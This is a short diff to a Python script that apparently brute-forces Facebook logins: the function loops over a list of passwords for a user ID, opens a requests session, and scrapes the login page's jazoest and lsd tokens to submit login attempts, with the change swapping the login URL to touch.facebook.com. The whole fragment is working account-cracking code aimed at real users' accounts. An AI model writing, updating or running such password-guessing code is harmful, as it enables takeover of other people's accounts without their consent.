@@ -1227,7 +1227,7 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092').text
+            free_fb = Session.get('https://touch.facebook.com').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
